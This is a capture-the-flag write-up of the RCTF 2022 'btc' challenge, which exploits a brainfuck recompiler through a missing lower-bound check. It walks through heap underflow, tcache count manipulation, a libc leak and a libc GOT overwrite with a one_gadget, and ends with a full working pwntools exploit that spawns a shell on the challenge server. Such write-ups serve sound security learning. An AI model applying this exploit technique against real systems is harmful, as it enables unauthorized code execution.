# btc

was a pwn challenge from RCTF 2022.

A VM Escape type of challenge, mixed with heap exploitation, which was interesting and pretty hard (only 2 solves at the end of the CTF)

I finish it a bit after the end of the CTF (raging..) cause I was busy this day and could not work full time on it..

anyway.. let's see what it is about..

## the setup

here is how the program works:

the program allocates an executable zone (of 0x2000 bytes) with mmap,

and copy the assembly functions that emulate the brainfuck instructions into it.

then it parses all the brainfuck code that we send it, and convert it to x86 `call` instruction to the corresponding function that emulate it

so the produced x86 code looks like a series of `call` instructions.

then at the end of the parsing , the program directly execute the produced x86 code

so it's more a recompiler, than an interpreter.

So let's have a look to the blackbox that are the assembly functions that emulate each instruction:

```assembly
; structure pointed by rdi
; offsets:
;    0x0  --> data memory chunk address
;    0x8  --> data memory chunk size
;    0x10 --> actual brainfuck ptr value
;    0x18 --> --x mapped memory chunk containing instructions functions
;    0x20 --> pointer to malloc() function
;    0x28 --> pointer to free() function
;    0x30 --> pointer to memcpy() function
;
; this function check higher bound of data memory chunk, (but not lower bound)
checkbounds:
	mov    rax,QWORD PTR [rdi+0x8]	; data mem size
	mov    rbx,QWORD PTR [rdi+0x10]  ; actual ptr value
	inc    rbx
	cmp    rax,rbx					; check if ptr if eventually bigger then chunk size if incremented
	jg     next
	push   rdi
	mov    rax,QWORD PTR [rdi+0x20]	; malloc function
	mov    rdi,QWORD PTR [rdi+0x8]	; chunk size
	shl    rdi,1					; double the chunk size
	call   rax						; call malloc
	mov    rdi,QWORD PTR [rsp]
	push   rax						; save new chunk addr on stack
	mov    rdx,QWORD PTR [rdi+0x8]		; chunk old size
	mov    rax,QWORD PTR [rdi+0x30]		; memmove function
	mov    rsi,QWORD PTR [rdi]			; old data memory chunk
	mov    rdi,QWORD PTR [rsp]			; new chunk addr
	call   rax							; call memmove (copy old chunk to new one)
	mov    rdi,QWORD PTR [rsp+0x8]
	mov    rax,QWORD PTR [rdi+0x28]		; free function pointer
	mov    rdi,QWORD PTR [rdi]			; get old chunk addr
	call   rax							; free old chunk()
	pop    rsi
	pop    rdi
	mov    QWORD PTR [rdi],rsi
	mov    rax,QWORD PTR [rdi+0x8]
	shl    rax,1
	mov    QWORD PTR [rdi+0x8],rax
exit:
	ret    
; '>' brainfuck instruction
; check higher bound and increase brainfuck ptr
	call   checkbounds
	add    QWORD PTR [rdi+0x10],0x1
	ret    
; '<' brainfuck instruction
; check higher bound and decrease brainfuck ptr
; --->  VULNERABLE   <--- because does not check the lower bound
	call   checkbounds
	sub    QWORD PTR [rdi+0x10],0x1
	ret    
; '+' brainfuck instruction
; *ptr++  --> increment ptr pointed byte
	mov    rax,QWORD PTR [rdi]
	mov    rbx,QWORD PTR [rdi+0x10]
	add    BYTE PTR [rax+rbx*1],0x1
	ret    
; '.' brainfuck instruction
; *ptr--  --> decrement ptr pointed byte
	mov    rax,QWORD PTR [rdi]
	mov    rbx,QWORD PTR [rdi+0x10]
	sub    BYTE PTR [rax+rbx*1],0x1
	ret    
; ',' brainfuck instruction
; *ptr = getchar()  --> read one char from stdin, and store it to ptr
	push   rdi
	mov    rax,QWORD PTR [rdi]		; data mem chunk address
	mov    rbx,QWORD PTR [rdi+0x10]	; ptr reg value
	add    rax,rbx
	mov    rsi,rax
	xor    rax,rax
	xor    rdi,rdi
	xor    rdx,rdx
	inc    rdx
	syscall 					; read 0,ptr,1
	pop    rdi
	ret    
; '.' brainfuck instruction
; putchar(*ptr)  --> write char pointer by ptr to stdout
	push   rdi
	mov    rax,QWORD PTR [rdi]		; data mem chunk address
	mov    rbx,QWORD PTR [rdi+0x10]	; ptr reg value
	add    rax,rbx
	mov    rsi,rax
	xor    rax,rax
	inc    rax
	mov    rdi,rax
	mov    rdx,rax
	syscall 				; write 1,ptr,1
	pop    rdi
	ret    
; ']' instruction
; test ptr pointed byte, and return condition code 
	mov    rax,QWORD PTR [rdi]
	mov    rbx,QWORD PTR [rdi+0x10]
	mov    cl,BYTE PTR [rax+rbx*1]
	and    cl,cl
	ret    
```


so, the x86 code is very straight forward.

It uses a structure stored in .bss section, that looks like this:

>    0x0  --> data memory chunk address
>    0x8  --> data memory chunk size
>    0x10 --> actual brainfuck ptr value
>    0x18 --> --x mapped memory chunk containing instructions functions
>    0x20 --> pointer to malloc() function
>    0x28 --> pointer to free() function
>    0x30 --> pointer to memcpy() function

it stores the actual data pointer chunk address and size, the brainfuck ptr position

and pointers to the various libc functions used by the x86 code, `malloc`, `free` and `memcpy`

as you have probably seen in the comments I did on the assembly code above (shame on you if you did not read it)

## the vulnerability

The vulnerability lies in the bounds checking function, that only check if we pass the upper size limit of chunk (and expand it if it's the case)

but it does not check if we pass the lower limit of chunk.

so we can say, that we have an heap underflow oob r/w

we can read and modify the data that is before our data memory chunk

another thing that we will use for exploitation, is the higher bound checking function

when we pass the chunk size with the brainfuck `ptr`, the bound checking function will allocate a chunk of double size, copy old chunk data into it, and free old chunk

we will use heavily this mechanism for the exploitation

## the plan

so what is the plan ? well... heap exploitation of course !

+ first we move the `ptr` forward to allocate a 0x20 (0x30 real) sized chunk
+ then we move back the `ptr` to reach the 0x10 (0x20 real) freed chunk pointer and leak it.
+ then we move the `ptr` forward to allocate a 0x80 (0x90 real) new chunk
+ then we move back `ptr` until we reach tcache_perthread_struct->counts for 0x90 chunk size
+ then we increase cache chunk 0x90 size entry to 7 (that will make 0x90 chunks goes in unsorted when freed)
+ then we advance `ptr` to allocate a 0x100 (0x110 real) sized chunk, it will free 0x90 chunk (make it goes to unsorted)
+ then we move `ptr` back until we reach unsorted libc address of 0x90 just freed chunk
+ then we leak the unsorted libc address and calculate libc base
+ then we move `ptr` back until we reach tcache_perthread_struct->counts for 0x200 (0x210 real) chunk size
+ then we increase tcache_perthread_struct->counts for 0x210 size to 1
+ then we move `ptr` forward to next chunk entries for chunk size of 0x210 chunks
+ then we write target address of libc GOT to next chunk entries for chunk size of 0x210 chunks, (our target)
+ then we advance `ptr` until it allocate a 0x200 (0x210 real) size chunk, this new chunk will be allocated in libc GOT , our target
+ then we go back to beginning of our new chunk in libc GOT
+ then we overwrite 12 entries of libc GOT (we will see why later)
+ then we move forward `ptr` until it allocates a new chunk of 0x400 size, that will fail because we messed up to much unsorted and tcache, and libc will spit out an error message on stderr, with `__libc_message` function, that function will call strlen() via the GOT entry, that will launch our one gadget, and we will have code execution..

OUF !!!!!!

## code execution inferno

that plan seems to have emerge from a wicked mind 🙃 .. anyway.. it works..😅

but I lost a lot of time with the code execution at the end of the exploitation when I had the allocation in libc

getting code execution with libc-2.35 is not so easy than in older versions

most of the classic hooks have been removed, many function pointers are mangled

the program ends with `_exit()` so not exit handlers tricks possible..

so...while disassembling `__libc_message` function , the function that spit out a message error when `malloc` or `free` failed for example,

I saw that it calls two functions via libc GOT, and as libc GOT is half RELRO, it is writable, and not mangled of course

if you look at `__libc_message` source code in glibc, in `sysdeps/posix/libc_fatal.c`

[https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/posix/libc_fatal.c](https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/posix/libc_fatal.c)

we can see that one these function is `strlen (str);` at GOT+0x98

the other one is `_memcpy()` at GOT+0x40_

so the first plan was to put a onegadget in one of those GOT entries, and provoque a `malloc` error to launch it...

but none of the onegadgets passed... 😬

getting the one gadget to works, was what took me too much time, and failing to finish it before the end..

one way that I found was to grep a `_memcpy()`calls in libc in another function,

and looks for something that will setup registers in a way that the onegadget will pass..

i found a good target in `__GI___printf_fp_l+5607`:

```assembly
=> 0x00007fcba8fb8f67 <__GI___printf_fp_l+5607>:	mov    rsi,QWORD PTR [rbp-0x108]
   0x00007fcba8fb8f6e <__GI___printf_fp_l+5614>:	mov    rdx,r14
   0x00007fcba8fb8f71 <__GI___printf_fp_l+5617>:	add    r15,0x4
   0x00007fcba8fb8f75 <__GI___printf_fp_l+5621>:	call   0x7fcba8f853e0 <*ABS*+0xa9850@plt> (it's _memcpy, at GOT+0x40
```

that piece of code will erase `rdx` as `r14` contains zero,  and by luck will set `rsì to zero as `[rbp-0x108]` contains zero

if will fullfill the constraints for this onegadget:

```python
0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

so I put this gadget `__GI___printf_fp_l+5607` in `strlen` GOT entry,  and the desired onegadget in `memcpy` GOT entry

then when `__libc_message` try to spit out an error message, it will jump to our gadget, that will clear register, and will jump to the onegadget (via `_memcpy`)

and guess what? We have exited from code execution inferno... 😅

![](./pics/gotshell.gif)

here is the exploit so:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("bfc")
libc = ELF("./libc.so.6")		# libc 2.35 from ubuntu 22.04

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

host, port = "119.13.89.159", "3301"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

# move backward pointer until we send a zero, restore back content to not overwrite data (8 bytes each time)
def goback(back):
  back = back>>3
  old = p.recv(1)
  p.send('A')
  while (back>0):
    p.send(old)
    old = p.recv(1)
    if (back==1):
      p.send(b'\x00')
    else:
      p.send('A')
    back -=1


# advance pointer until we send a zero, restore back content to not overwrite data (8 bytes each time)
def goforward(amount):
  amount = amount>>3
  old = p.recv(1)
  p.send('A')
  while (amount>0):
    p.send(old)
    old = p.recv(1)
    if (amount==1):
      p.send(b'\x00')
    else:
      p.send('A')
    amount -=1

# BACK function
BACK = '<<<<<<<<.,[,<<<<<<<<.,]'
# FORWARD function
FORWARD = '>>>>>>>>.,[,>>>>>>>>.,]'

payload = '>'*0x10		# advance to allocate a bigger chunk
payload += '<'*0x30		# move ptr back to heap pointer
payload += '.>.>.>.>.>.>.>.>'	# leak heap pointer
payload += FORWARD		# advance ptr to allocate a 0x90 size chunk
payload += BACK			# move ptr back until we reach tcache_perthread_struct->counts for 0x90 chunk size
payload += '<<+++++++>>'	# set tcache chunk 0x90 size entry to 7

payload += FORWARD		# advance ptr to allocate a 0x100 (0x110 real) sized chunk, it will fre 0x90 chunk (make it goes to unsorted)
payload += BACK			# move ptr back until we reach unsorted libc address of 0x90 freed chunk
payload += '.>'*8		# leak unsorted libcaddress
payload += BACK			# move ptr back until we reach tcache_perthread_struct->counts for 0x200 (0x210 real) chunk size
payload += '<<+>>'		# increase tcache_perthread_struct->counts for 0x210 size to 1 
payload += FORWARD		# move ptr forward to next chunk address for chunk size of 0x210 chunks
payload += ',>,>,>,>,>,>,>,>'	# write target address of libc got to next chunk address for chunk size of 0x210 chunks, our target
payload += FORWARD		# advance ptr until it allocate a 0x200 (0x210 real) size chunk
payload += BACK			# go back to beginning of our new chunk in libc got
payload += ',>,>,>,>,>,>,>,>'*12	# overwrite 12 entries of libc cGOT
payload += '>'*0x1c0	# launch last malloc(0x400) that will give us code exec


sla('size of code:', str(len(payload)))
sla('code:', payload)

# get our leak
leak = u64(p.recv(8))
print('leak = '+hex(leak))
heap = (leak<<12)-0x13000
logleak('heap base', heap)
goforward(0x80)			# move forward of 0x80 bytes to allocate a 0x80 (0x90 real) tcache chunk
goback(0x13708)			# move back ptr to reach tcache_perthread_struct->counts for 0x90 chunk size, and set the counts to 7
goforward(0x13738)		# move forward until it allocate a 0x100 (0x110 real) tcache chunk,  0x90 chunk will be freed, and will go to unsorted (as counts==7)
goback(0x128)			# move back ptr to reach unsorted address in 0x90 freed chunk

# get our libc leak
libc.address = u64(p.recv(8))-0x219c00		# calculate libc base
logbase()

onegadgets = one_gadget(libc.path, libc.address)



goback(0x13670)			# move back ptr to reach tcache_perthread_struct->counts for 0x210 (0x210 real) chunk size, and set the counts to 1
goforward(0x130)		# move ptr forward to next chunk address for chunk size of 0x210 chunks
p.send(p64(libc.address+0x219040))	# write target GOT address as next 0x210 chunk address, our target

goforward(0x13700)		# move forward until it allocate a 0x200 (0x210 real) tcache chunk,  it will be allocated in libc GOT
goback(0x140)			# move backward to reach beginning of our new chunk in libc GOT

# gadget to clear rsi,rdx and jump to strlen() via libc got
target = libc.address+0x5bf67
logleak('target', target)
# overwrite 12 GOT entries, 10 first with our one gadget
# 2 last with our gadget in libc that clears rsi and rdx, and jump to strlen (libc.GOT+0x40)
p.send(p64(onegadgets[10])*10+p64(target)*2)

# now we got shell !!!
p.sendline('id;echo "bingo!!!"')

p.interactive()
```
*nobodyisnobody still pwning...*